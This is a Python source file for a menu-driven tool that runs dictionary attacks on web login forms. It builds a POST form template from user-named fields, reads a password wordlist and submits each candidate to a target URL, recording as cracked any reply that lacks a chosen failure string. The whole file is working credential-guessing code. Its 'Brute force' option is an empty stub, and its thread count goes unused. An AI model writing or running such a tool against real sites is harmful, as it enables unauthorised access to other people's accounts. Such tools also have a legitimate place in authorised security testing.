import requests
import InputNFileIO


class CrackerSession:
    def __init__(self):
        """
        Assigns default values for all constants
        """
        # Target URL
        self.url = ""
        # List of successfully cracked passwords
        self.cracked_passwords = []
        # POST request form data for logging in
        self.form_data = {}
        # Number of threads
        self.num_threads = 1
        # Whether or not a target has been selected
        self.target_selected = False
        # Text for the login cracker session menu
        self.menu = """
1. Configure target
2. Crack
3. Cracked passwords
4. Brute force
5. Back
"""


def assign_host():
    """
    This function helps to set the target host.
    :return: (string) The address of the target
    """
    while True:
        # The strip is added just in case extra white space is added
        address = input("Enter target URL: ").strip()
        try:
            # See if the address can be accessed
            r = requests.get(address)
        # If the URL can't be reached, then tell the user and try again
        except requests.exceptions.MissingSchema:
            print("Invalid URL!")
        else:
            r.close()
            print("Target set to: " + address)
            break
    # Let the session know that a target has been configured
    crack_session.target_selected = True
    return address


def form():
    """
    This function develops a login form template for the cracker to use during the attack.
    :return:
    """
    # Creates a list of variables in POST form
    values = input("Enter form variable names(ex: user pass): ").split()
    # Create a dictionary and assign all of the previously defined variables as empty strings
    form_values = {value: "" for value in values}
    # This loop establishes static variables
    while True:
        InputNFileIO.clear()
        while True:
            response = InputNFileIO.yes_or_no_handler("Do you need to assign any static values? (y/n): ")
            # If the form has static variables
            if response == "y":
                InputNFileIO.clear()
                # Display a list of the variables
                for i, key in enumerate(form_values.items()):
                    print(f"{i + 1}. {key[0]} = {key[1]}")
                choice = InputNFileIO.int_input_getter("Which one?: ", range(1, len(values) + 1))
                new_val = input("What value would you like to assign to this variable?: ")
                form_values[values[choice - 1]] = new_val
            # Once the user is finished configuring static variables, return the form
            elif response == "n":
                return form_values


def set_threads():
    """
    This function gets the number of threads the user wishes to use.
    """
    return InputNFileIO.int_input_getter("How many threads(1-16): ", range(1, 17))


def select_var():
    """
    This function creates a test form and also gets the index of the variable the user is cracking.
    :return: (dict, string) Returns the temp form and the name of the variable we are cracking
    """
    # List of variables in order
    options = []
    # Lists the variables in a format the user can select from
    for i, key in enumerate(crack_session.form_data.items()):
        print(f"{i + 1}. {key[0]} = {key[1]}")
        options.append(key[0])
    # Gets the variable we will be cracking
    var = InputNFileIO.int_input_getter("Which variable are you cracking?: ", range(1, len(crack_session.form_data) + 1)
                                        )
    # Assign test_form to be a copy of the currently generated POST form
    test_form = crack_session.form_data.copy()
    # In the test form, replace the value of the target variable with a replaceable string
    test_form[options[var - 1]] = "<val>"
    return test_form, options[var - 1]


def crack(test_form, var, passwords, fail_message):
    """
    This function is used to crack the password with a dictionary attack.
    :param test_form: (dict) Temporary POST form
    :param var: (string) The name of the variable being cracked
    :param passwords: (list) List of passwords from the wordlist
    :param fail_message: (string) Message to test whether an attempt was successful
    """
    # Creates a copy of the test form for manipulation
    temp = test_form.copy()
    # Successful attempts
    success = 0
    # Failed attempts
    fail = 0
    # For every password in the wordlist, attempt to login to the target
    for password in passwords:
        temp[var] = password
        r = requests.post(crack_session.url, temp)
        # If the fail message isn't in the returned web page then add the credentials to cracked_passwords
        if fail_message not in r.text:
            crack_session.cracked_passwords.append((crack_session.url, temp))
            success += 1
        else:
            fail += 1
    # Print a synopsis of the crack
    print(f"Crack synopsis:\nSuccessful attempts = {success}\nFailed attempts = {fail}")


def get_password_list():
    """
    This function creates a list of passwords from a wordlist.
    :return: (list) List of passwords
    """
    passwords = []
    while True:
        InputNFileIO.clear()
        # Enter the path to the wordlist
        password_file = input("Enter the password file path: ")
        try:
            my_file = open(password_file)
        # If there is a file not found error, let the user know, and try again
        except FileNotFoundError:
            input("This is not a valid path! Press enter to try again...")
        else:
            break
    # Assigns each element of the list as a line in the wordlist
    all_the_lines = my_file.readlines()
    for i in all_the_lines:
        passwords.append(i.strip())
    return passwords


def show_cracked():
    """
    This function simply prints all of the cracked passwords.
    """
    print(crack_session.cracked_passwords)


def setup():
    """
    This function organizes input from the menu and directs the user accordingly.
    """
    while True:
        InputNFileIO.clear()
        print("Current Target:", crack_session.url, end="")
        user_choice = InputNFileIO.int_input_getter(crack_session.menu, range(1, 6))
        InputNFileIO.clear()
        if user_choice == 1:  # Configure target
            # Assign primary target details
            crack_session.url = assign_host()
            crack_session.form_data = form()
            InputNFileIO.clear()
            crack_session.num_threads = set_threads()
        elif user_choice == 2:  # Crack
            # If there isn't form data, continue
            if not crack_session.form_data or not crack_session.target_selected:
                print("No form data configured!")
            # Otherwise, crack the target
            else:
                new_form, var = select_var()
                passwords = get_password_list()
                InputNFileIO.clear()
                fail_message = input("Enter the fail message: ")
                InputNFileIO.clear()
                crack(new_form, var, passwords, fail_message)
        elif user_choice == 3:  # Cracked passwords
            # Show the cracked passwords
            show_cracked()
        elif user_choice == 4:  # Brute force
            pass
        else:  # Back
            # If the user chooses back, go back to the main menu
            break
        input("Press enter to continue...")


# Creates CrackerSession object
crack_session = CrackerSession()
